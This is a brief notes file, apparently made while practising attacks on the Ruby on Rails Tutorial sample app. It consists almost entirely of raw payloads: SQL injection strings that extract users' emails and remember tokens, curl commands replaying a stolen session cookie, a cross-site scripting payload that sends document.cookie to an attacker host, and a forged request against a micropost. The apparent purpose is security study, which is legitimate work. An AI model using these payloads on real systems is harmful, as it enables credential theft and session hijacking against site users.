# Ruby on Rails Tutorial: sample app

# SQL injection
a' ) or 1 = 1  --  
XXX') union select 1, email, 1, 1, 1 from users --  
XXX') union select 1, remember_token, 1, 1, 1 from users --  

curl "http://www.blog.com:3000/" --cookie remember_token=


# CSS
# Post this
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>


# XSRF
curl "http://www.blog.com:3000/microposts/7" --cookie remember_token=
